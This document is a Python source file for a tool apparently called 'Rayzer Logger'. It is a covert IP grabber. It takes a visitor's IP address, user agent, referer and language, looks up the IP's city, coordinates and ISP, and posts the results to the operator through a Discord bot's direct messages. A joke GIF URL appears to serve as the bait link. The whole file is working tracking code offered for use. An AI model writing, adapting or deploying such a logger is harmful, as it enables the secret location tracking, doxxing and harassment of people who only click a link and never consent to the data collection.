import requests
from datetime import datetime

# /web/DISCORD_BOT/rayzer.py

# CONFIGURATION
BOT_TOKEN = "PUT_BOT_TOKEN_HERE"
OWNER_ID = "PUT_OWNER_ID_HERE"
GIF_URL = "https://media.tenor.com/Po3vHMaLLqgAAAAC/ronaldo-osuruk.gif"

def send_to_discord_bot(ip, user_agent, referer, lang):
    try:
        geo_r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,query")
        geo = geo_r.json()
    except:
        geo = {}

    embed = {
        "embeds": [{
            "title": "New Log (Discord Bot DM) 🔍",
            "color": 0x5865f2,
            "fields": [
                {"name": "IP", "value": f"`{ip}`", "inline": True},
                {"name": "Location", "value": f"{geo.get('city', '?')}, {geo.get('regionName', '?')}, {geo.get('country', '?')}", "inline": True},
                {"name": "Cords", "value": f"{geo.get('lat', '?')}, {geo.get('lon', '?')}", "inline": True},
                {"name": "ISP", "value": geo.get("isp", "Unknown"), "inline": False},
                {"name": "User-Agent", "value": f"```{user_agent}```", "inline": False},
                {"name": "Referer", "value": referer, "inline": False},
                {"name": "Language", "value": lang, "inline": True}
            ],
            "footer": {"text": "Rayzer Logger"},
            "timestamp": datetime.utcnow().isoformat() + "Z"
        }]
    }

    try:
        headers = {
            "Authorization": f"Bot {BOT_TOKEN}",
            "Content-Type": "application/json"
        }
        dm_res = requests.post("https://discord.com/api/v10/users/@me/channels", 
                               headers=headers, 
                               json={"recipient_id": OWNER_ID})
        dm_data = dm_res.json()
        
        if "id" in dm_data:
            channel_id = dm_data["id"]
            requests.post(f"https://discord.com/api/v10/channels/{channel_id}/messages", 
                          headers=headers, 
                          json=embed)
    except Exception as e:
        print(f"Error: {e}")